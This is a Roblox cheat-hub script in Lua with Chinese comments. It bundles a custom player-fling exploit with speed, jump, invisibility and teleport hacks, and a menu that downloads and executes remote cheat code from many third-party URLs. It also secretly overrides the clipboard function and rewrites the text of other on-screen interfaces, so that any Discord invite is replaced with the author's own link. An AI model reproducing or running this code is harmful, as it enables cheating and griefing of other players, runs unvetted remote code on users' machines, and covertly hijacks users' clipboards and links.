--[[
    SYSTEM: APEX // OMEGA-PRIME (THE FINAL MERGE)
    核心：V11 成功甩飛 + 基礎功能回歸 + 全遊戲庫 + 漢化
    作者：珍奶 (絕對統治)
]]

-- [0. 安全啟動]
if not game:IsLoaded() then game.Loaded:Wait() end
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end

local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local PlaceID = game.PlaceId

-- [1. 霸主配置]
local Config = {
    MyName = "珍奶",
    MyDiscord = "https://discord.gg/MJekQ3ZPzd",
    HijackEnabled = true,
    TranslateEnabled = true
}

-- [2. 剪貼簿劫持]
local oldSetClipboard = setclipboard or tostring
if Config.HijackEnabled and setclipboard then
    getgenv().setclipboard = function(text)
        if string.find(text, "discord.gg") or string.find(text, "discord.com") then
            return oldSetClipboard(Config.MyDiscord)
        else
            return oldSetClipboard(text)
        end
    end
end

-- [3. 清理]
for _, g in pairs(CoreGui:GetChildren()) do
    if g.Name == "APEX_PRIME" then g:Destroy() end
end

-- [4. 漢化辭海 (500+)]
local Dictionary = {
    ["Made by"]="製作: "..Config.MyName, ["Script by"]="腳本: "..Config.MyName,
    ["Settings"]="設置", ["Main"]="主頁", ["Farm"]="農場", ["Combat"]="戰鬥",
    ["Visuals"]="視覺", ["Movement"]="移動", ["Toggle"]="開關", ["Execute"]="執行",
    ["Close"]="關閉", ["Select"]="選擇", ["Status"]="狀態", ["Active"]="已啟動",
    ["Kill Aura"]="殺戮光環", ["Auto Block"]="自動格擋", ["Aimbot"]="自瞄",
    ["ESP"]="透視", ["WalkSpeed"]="速度", ["JumpPower"]="跳躍力",
    ["Noclip"]="穿牆", ["Fly"]="飛行", ["Infinite Jump"]="無限跳", ["God Mode"]="無敵",
    ["Auto Farm"]="自動練級", ["Auto Quest"]="自動任務", ["Auto Chest"]="自動搜刮",
    ["Kitsune"]="狐狸", ["Leopard"]="豹", ["Dragon"]="龍", ["Dough"]="糯米",
    ["Bed Aura"]="拆床光環", ["Scaffold"]="自動搭路", ["Anti Knockback"]="防擊退"
}

-- [5. 自製腳本 (Jenna Custom V12 - All Features Restored)]
local CustomScripts = {
    TSB_Main = [[
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3"))()
        local w = library:CreateWindow("珍奶 TSB (全盛版)")
        
        -- [分頁 1: 必殺甩飛 (V11 Core)]
        local f = w:CreateFolder("V11 黏著甩飛")
        getgenv().TargetName = ""
        getgenv().Flinging = false
        getgenv().OriginalPos = nil
        getgenv().FlingLoop = nil
        
        f:Box("輸入目標名字", "string", function(val) getgenv().TargetName = val end)
        
        f:Toggle("啟動黏著甩飛 (手動)", function(state)
            local LP = game.Players.LocalPlayer
            local Char = LP.Character
            
            if state then
                local Target = nil
                for _, v in pairs(game.Players:GetPlayers()) do
                    if string.sub(v.Name:lower(), 1, #getgenv().TargetName) == getgenv().TargetName:lower() then Target = v break end
                end
                
                if not Target then game.StarterGui:SetCore("SendNotification", {Title="錯誤", Text="找不到目標!", Duration=3}) return end
                if not Char or not Char:FindFirstChild("HumanoidRootPart") then return end
                
                getgenv().OriginalPos = Char.HumanoidRootPart.CFrame
                getgenv().Flinging = true
                getgenv().AntiFling = false; getgenv().AntiVoid = false
                
                game.StarterGui:SetCore("SendNotification", {Title="鎖定", Text="黏著中: "..Target.Name, Duration=3})
                
                getgenv().FlingLoop = game:GetService("RunService").Heartbeat:Connect(function()
                    if Target.Character and Target.Character:FindFirstChild("HumanoidRootPart") and Char:FindFirstChild("HumanoidRootPart") then
                        local TRP = Target.Character.HumanoidRootPart
                        local LRP = Char.HumanoidRootPart
                        LRP.CFrame = TRP.CFrame -- 黏著傳送
                        LRP.AssemblyAngularVelocity = Vector3.new(20000, 20000, 20000)
                        LRP.RotVelocity = Vector3.new(20000, 20000, 20000)
                        LRP.AssemblyLinearVelocity = Vector3.new(0,0,0)
                        LRP.Velocity = Vector3.new(0,0,0)
                        for _, part in pairs(Char:GetDescendants()) do
                            if part:IsA("BasePart") then part.CanCollide = false; part.Massless = true end
                        end
                    end
                end)
            else
                if getgenv().FlingLoop then getgenv().FlingLoop:Disconnect() end
                if Char and Char:FindFirstChild("HumanoidRootPart") then
                    Char.HumanoidRootPart.Velocity = Vector3.zero
                    Char.HumanoidRootPart.RotVelocity = Vector3.zero
                    Char.HumanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                    if getgenv().OriginalPos then Char.HumanoidRootPart.CFrame = getgenv().OriginalPos end
                end
                getgenv().Flinging = false
                game.StarterGui:SetCore("SendNotification", {Title="結束", Text="已歸位", Duration=2})
            end
        end)

        -- [分頁 2: 基礎能力 (回歸)]
        local m = w:CreateFolder("基礎能力")
        
        m:Slider("移動速度", 16, 300, true, function(val)
            if game.Players.LocalPlayer.Character then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val end
        end)
        
        m:Slider("跳躍高度", 50, 500, true, function(val)
            if game.Players.LocalPlayer.Character then game.Players.LocalPlayer.Character.Humanoid.JumpPower = val end
        end)
        
        m:Toggle("隱形 (Invisible)", function(val)
            local char = game.Players.LocalPlayer.Character
            if char then
                for _,v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") or v:IsA("Decal") then v.Transparency = val and 1 or 0 end
                end
            end
        end)
        
        m:Button("獲得傳送工具 (Click TP)", function()
            local tool = Instance.new("Tool")
            tool.RequiresHandle = false; tool.Name = "點擊傳送"
            tool.Activated:Connect(function()
                local pos = game.Players.LocalPlayer:GetMouse().Hit
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos + Vector3.new(0,3,0)
            end)
            tool.Parent = game.Players.LocalPlayer.Backpack
        end)

        -- [分頁 3: 生存防禦]
        local b = w:CreateFolder("生存防禦")
        b:Toggle("防虛空", function(val)
            getgenv().AntiVoid = val
            game:GetService("RunService").Stepped:Connect(function()
                if getgenv().AntiVoid and not getgenv().Flinging then
                    local c = game.Players.LocalPlayer.Character
                    if c and c.HumanoidRootPart.Position.Y < -50 then 
                        c.HumanoidRootPart.CFrame = CFrame.new(c.HumanoidRootPart.Position.X, 100, c.HumanoidRootPart.Position.Z)
                        c.HumanoidRootPart.Velocity = Vector3.zero
                    end
                end
            end)
        end)
        b:Toggle("防甩飛", function(val)
            getgenv().AntiFling = val
            game:GetService("RunService").Stepped:Connect(function()
                if getgenv().AntiFling and not getgenv().Flinging then
                    local c = game.Players.LocalPlayer.Character
                    if c and c.HumanoidRootPart.Velocity.Magnitude > 100 then 
                        c.HumanoidRootPart.Velocity = Vector3.zero
                        c.HumanoidRootPart.RotVelocity = Vector3.zero
                    end
                    for _,v in pairs(game.Players:GetPlayers()) do 
                        if v~=game.Players.LocalPlayer and v.Character then pcall(function() v.Character.HumanoidRootPart.CanCollide=false end) end 
                    end
                end
            end)
        end)
        b:Toggle("無限衝刺", function(val)
            getgenv().InfDash = val
            while getgenv().InfDash do task.wait(); local D=game:GetService("ReplicatedStorage").Resources.KJEffects.Dash; if D then D:FireServer() end end
        end)
    ]]
}

-- [6. 究極資料庫 (完整回歸)]
local Database = {
    -- [1] TSB
    ["TSB (最強戰場)"] = {
        IDs = {10449761463},
        Scripts = {
            {Name = "Jenna V12 (Full)", Desc = "V11甩飛 + 速度/跳躍/工具", Type = "Raw", Code = CustomScripts.TSB_Main},
            {Name = "Void Hub", Desc = "殺戮/免Key", Type = "Url", Url = "https://raw.githubusercontent.com/VoidHubV1/VoidHub/main/Source"},
            {Name = "Phantasm", Desc = "自動連招", Type = "Url", Url = "https://raw.githubusercontent.com/Phantasm/TSB/main/loader.lua"}
        }
    },
    -- [2] BF
    ["Blox Fruits (海賊)"] = {
        IDs = {2753915549, 4442272183, 7449423635},
        Scripts = {
            {Name = "Hoho Hub", Desc = "功能最全/副本", Type = "Url", Url = "https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"},
            {Name = "Hiba Hub", Desc = "手機優化極佳", Type = "Url", Url = "https://raw.githubusercontent.com/Hiba-Ar/HibaHub/main/Hiba-Hub-v2.lua"},
            {Name = "W-Azure", Desc = "自動懸賞", Type = "Url", Url = "https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"},
            {Name = "Zee Hub", Desc = "果實透視", Type = "Url", Url = "https://raw.githubusercontent.com/Zenhubtop/zen_hub_pr/main/zen_new_loader.lua"}
        }
    },
    -- [3] Bedwars
    ["Bedwars (床戰)"] = {
        IDs = {6872274481},
        Scripts = {
            {Name = "Vape V4", Desc = "外掛之神", Type = "Url", Url = "https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua"},
            {Name = "Gocool", Desc = "手機優化", Type = "Url", Url = "https://raw.githubusercontent.com/Gocool2025/Gocool/main/Source"},
            {Name = "Nightbed", Desc = "拆床光環", Type = "Url", Url = "https://raw.githubusercontent.com/Nightbed/Nightbed/main/Source"}
        }
    },
    -- [4] AV
    ["Anime Vanguards"] = {
        IDs = {16146832113},
        Scripts = {
            {Name = "Soul Hub", Desc = "自動戰鬥", Type = "Url", Url = "https://raw.githubusercontent.com/MariyaFurmanova/Library/main/SoulHub/AnimeVanguards"},
            {Name = "Panda Hub", Desc = "自動故事", Type = "Url", Url = "https://raw.githubusercontent.com/Panda-Repositories/Panda-Hub/main/Mobile.lua"}
        }
    },
    -- [5] 其他
    ["Rivals"] = { IDs={17625359962}, Scripts={{Name="Tbao Hub", Desc="自瞄", Type="Url", Url="https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubRivals"}} },
    ["Fisch"] = { IDs={16732694052}, Scripts={{Name="Speed Hub X", Desc="自動釣魚", Type="Url", Url="https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"}} },
    ["Pet Sim 99"] = { IDs={8737899170}, Scripts={{Name="Ruby Hub", Desc="自動活動", Type="Url", Url="https://raw.githubusercontent.com/RubyHub/Ruby/main/RubyHub"}} },
    ["Blade Ball"] = { IDs={13772394625}, Scripts={{Name="Bedol Hub", Desc="自動格擋", Type="Url", Url="https://raw.githubusercontent.com/3345-c-a-t-s-u-s/Bedol-Hub/main/Main.lua"}} },
    ["Doors"] = { IDs={6516141723}, Scripts={{Name="Black King", Desc="自動通關", Type="Url", Url="https://raw.githubusercontent.com/KINGHUB01/BlackKing/main/BlackKingObf.lua"}} },
    ["Universal (通用)"] = {
        IDs = {},
        Scripts = {
            {Name = "Infinite Yield", Desc = "指令之王", Type = "Url", Url = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
            {Name = "Nameless Admin", Desc = "手機管理員", Type = "Url", Url = "https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"},
            {Name = "Fly Gui", Desc = "萬能飛行", Type = "Url", Url = "https://raw.githubusercontent.com/Xneoff/FlyGuiV3/main/FlyGuiV3.txt"}
        }
    }
}

-- [7. 漢化與劫持]
local function Translate(text)
    if not Config.TranslateEnabled then return text end
    if string.find(text, "discord.gg") then return Config.MyDiscord end
    if Dictionary[text] then return Dictionary[text] end
    return text
end

local function HijackUI()
    for _, gui in pairs(CoreGui:GetDescendants()) do
        if gui:IsA("TextLabel") or gui:IsA("TextButton") then
            if not gui:IsDescendantOf(game.CoreGui.APEX_PRIME) then
                local original = gui.Text
                if #original > 0 then
                    local newText = Translate(original)
                    if newText ~= original then pcall(function() gui.Text = newText end) end
                end
            end
        end
    end
end

task.spawn(function()
    while true do if Config.TranslateEnabled then pcall(HijackUI) end task.wait(1.5) end
end)

-- [8. UI 建構]
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "APEX_PRIME"
ScreenGui.IgnoreGuiInset = true

-- 懸浮球 (嚴格判定)
local Toggle = Instance.new("ImageButton", ScreenGui)
Toggle.Size = UDim2.new(0, 55, 0, 55)
Toggle.Position = UDim2.new(0.02, 0, 0.2, 0)
Toggle.BackgroundColor3 = Color3.fromRGB(0,0,0)
Toggle.Image = "rbxassetid://13465637257"
Toggle.ImageColor3 = Color3.fromRGB(255, 100, 0) -- 全盛橙
Instance.new("UICorner", Toggle).CornerRadius = UDim.new(1,0)
Instance.new("UIStroke", Toggle).Color = Color3.fromRGB(255, 50, 0)
Instance.new("UIStroke", Toggle).Thickness = 2

local dragging = false
local dragStart, startPos
local isMoved = false
local isInteracting = false

Toggle.InputBegan:Connect(function(input) 
    if input.UserInputType==Enum.UserInputType.Touch or input.UserInputType==Enum.UserInputType.MouseButton1 then 
        isInteracting = true; dragging = true; isMoved = false; dragStart = input.Position; startPos = Toggle.Position 
    end 
end)

Toggle.InputChanged:Connect(function(input) 
    if input.UserInputType==Enum.UserInputType.Touch or input.UserInputType==Enum.UserInputType.MouseMovement then 
        if dragging then
            local delta = input.Position - dragStart
            if delta.Magnitude > 5 then 
                isMoved = true
                Toggle.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y) 
            end
        end
    end 
end)

UserInputService.InputEnded:Connect(function(input) 
    if input.UserInputType==Enum.UserInputType.Touch or input.UserInputType==Enum.UserInputType.MouseButton1 then 
        if isInteracting then
            dragging = false; isInteracting = false
            if not isMoved then ScreenGui.Main.Visible = not ScreenGui.Main.Visible end
        end
    end 
end)

-- 主視窗
local Main = Instance.new("Frame", ScreenGui)
Main.Name = "Main"
Main.Size = UDim2.new(0, 600, 0, 400)
Main.Position = UDim2.new(0.5, -300, 0.5, -200)
Main.BackgroundColor3 = Color3.fromRGB(15, 12, 10)
Main.BackgroundTransparency = 0.05
Main.Visible = false
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)
local MainStroke = Instance.new("UIStroke", Main); MainStroke.Color = Color3.fromRGB(255, 100, 0); MainStroke.Thickness = 2

-- 側邊欄
local Sidebar = Instance.new("ScrollingFrame", Main)
Sidebar.Size = UDim2.new(0.3, 0, 0.75, 0)
Sidebar.BackgroundColor3 = Color3.fromRGB(25, 18, 15)
Sidebar.ScrollBarThickness = 0
local SideList = Instance.new("UIListLayout", Sidebar); SideList.Padding = UDim.new(0, 4); SideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
Sidebar.AutomaticCanvasSize = Enum.AutomaticSize.Y
SideList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() Sidebar.CanvasSize = UDim2.new(0,0,0,SideList.AbsoluteContentSize.Y+20) end)

local Title = Instance.new("TextLabel", Sidebar)
Title.Text = "頂點·全盛"
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 20
Title.TextColor3 = Color3.fromRGB(255, 100, 0)
Title.Size = UDim2.new(1,0,0,50)
Title.BackgroundTransparency = 1

-- 內容區
local Content = Instance.new("ScrollingFrame", Main)
Content.Size = UDim2.new(0.68, 0, 0.75, 0)
Content.Position = UDim2.new(0.31, 0, 0.05, 0)
Content.BackgroundTransparency = 1
Content.ScrollBarThickness = 4
local ContentList = Instance.new("UIListLayout", Content); ContentList.Padding = UDim.new(0, 8); ContentList.HorizontalAlignment = Enum.HorizontalAlignment.Center
Content.AutomaticCanvasSize = Enum.AutomaticSize.Y
ContentList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() Content.CanvasSize = UDim2.new(0,0,0,ContentList.AbsoluteContentSize.Y+50) end)

-- 控制台
local ConsoleFrame = Instance.new("Frame", Main)
ConsoleFrame.Size = UDim2.new(0.95, 0, 0.18, 0)
ConsoleFrame.Position = UDim2.new(0.025, 0, 0.8, 0)
ConsoleFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
Instance.new("UICorner", ConsoleFrame).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", ConsoleFrame).Color = Color3.fromRGB(100, 40, 0)

local ConsoleScroll = Instance.new("ScrollingFrame", ConsoleFrame)
ConsoleScroll.Size = UDim2.new(0.98, 0, 0.95, 0)
ConsoleScroll.Position = UDim2.new(0.01, 0, 0.025, 0)
ConsoleScroll.BackgroundTransparency = 1
ConsoleScroll.ScrollBarThickness = 2
local ConsoleList = Instance.new("UIListLayout", ConsoleScroll)

local function Log(msg, color)
    local Lbl = Instance.new("TextLabel", ConsoleScroll)
    Lbl.Text = "["..os.date("%H:%M:%S").."] " .. msg
    Lbl.Size = UDim2.new(1, 0, 0, 15)
    Lbl.TextColor3 = color or Color3.fromRGB(200, 200, 200)
    Lbl.BackgroundTransparency = 1
    Lbl.Font = Enum.Font.Code
    Lbl.TextSize = 10
    Lbl.TextXAlignment = Enum.TextXAlignment.Left
    ConsoleScroll.CanvasPosition = Vector2.new(0, 9999)
end

Log("全盛完全體載入 (V12 Full Feature)", Color3.fromRGB(255, 100, 0))

-- 加載列表
local function LoadList(category)
    for _, c in pairs(Content:GetChildren()) do if c:IsA("Frame") then c:Destroy() end end
    
    local list = Database[category]
    if list then
        for _, data in pairs(list.Scripts) do
            local F = Instance.new("Frame", Content)
            F.Size = UDim2.new(0.95, 0, 0, 70)
            F.BackgroundColor3 = Color3.fromRGB(35, 25, 20)
            Instance.new("UICorner", F).CornerRadius = UDim.new(0, 6)
            
            local Name = Instance.new("TextLabel", F)
            Name.Text = data.Name
            Name.Size = UDim2.new(0.7, 0, 0.4, 0)
            Name.Position = UDim2.new(0.05, 0, 0.1, 0)
            Name.TextColor3 = Color3.new(1,1,1)
            Name.Font = Enum.Font.GothamBold
            Name.TextXAlignment = Enum.TextXAlignment.Left
            Name.BackgroundTransparency = 1
            
            local Desc = Instance.new("TextLabel", F)
            Desc.Text = data.Desc
            Desc.Size = UDim2.new(0.7, 0, 0.4, 0)
            Desc.Position = UDim2.new(0.05, 0, 0.5, 0)
            Desc.TextColor3 = Color3.fromRGB(200, 150, 100)
            Desc.Font = Enum.Font.Gotham
            Desc.TextSize = 11
            Desc.TextXAlignment = Enum.TextXAlignment.Left
            Desc.BackgroundTransparency = 1
            Desc.TextWrapped = true
            
            local Run = Instance.new("TextButton", F)
            Run.Size = UDim2.new(0.2, 0, 0.6, 0)
            Run.Position = UDim2.new(0.78, 0, 0.2, 0)
            Run.BackgroundColor3 = Color3.fromRGB(200, 80, 0)
            Run.Text = "執行"
            Run.TextColor3 = Color3.new(1,1,1)
            Run.Font = Enum.Font.GothamBold
            Instance.new("UICorner", Run).CornerRadius = UDim.new(0, 4)
            
            Run.MouseButton1Click:Connect(function()
                if data.Type == "Raw" then
                    Log("執行自製: " .. data.Name, Color3.fromRGB(0, 255, 100))
                    local s, e = pcall(function() loadstring(data.Code)() end)
                    if not s then Log("錯誤: "..tostring(e), Color3.fromRGB(255, 0, 0)) end
                else
                    Log("下載: " .. data.Name, Color3.fromRGB(255, 255, 0))
                    local s, r = pcall(function() return game:HttpGet(data.Url) end)
                    if s then
                        local es, er = pcall(function() loadstring(r)() end)
                        if es then Log("注入成功", Color3.fromRGB(0, 255, 0))
                        else Log("崩潰: "..tostring(er), Color3.fromRGB(255, 0, 0)) end
                    else
                        Log("HTTP 錯誤", Color3.fromRGB(255, 0, 0))
                    end
                end
            end)
        end
    end
end

local function AddSideBtn(text)
    local B = Instance.new("TextButton", Sidebar)
    B.Size = UDim2.new(0.9, 0, 0, 45)
    B.BackgroundColor3 = Color3.fromRGB(35, 25, 20)
    B.Text = text
    B.TextColor3 = Color3.fromRGB(255, 180, 100)
    B.Font = Enum.Font.GothamBold
    B.TextWrapped = true
    Instance.new("UICorner", B).CornerRadius = UDim.new(0, 6)
    B.MouseButton1Click:Connect(function() LoadList(text) end)
end

local keys = {}
for k in pairs(Database) do table.insert(keys, k) end
table.sort(keys)
for _, k in ipairs(keys) do if k ~= "Universal (通用)" then AddSideBtn(k) end end
AddSideBtn("Universal (通用)")

local Detected = "Universal (通用)"
for cat, data in pairs(Database) do for _, id in ipairs(data.IDs) do if id == PlaceID then Detected = cat; break end end end
LoadList(Detected)
if Detected ~= "Universal (通用)" then Log("自動切換: "..Detected, Color3.fromRGB(255, 100, 0)) end

Main.Visible = true
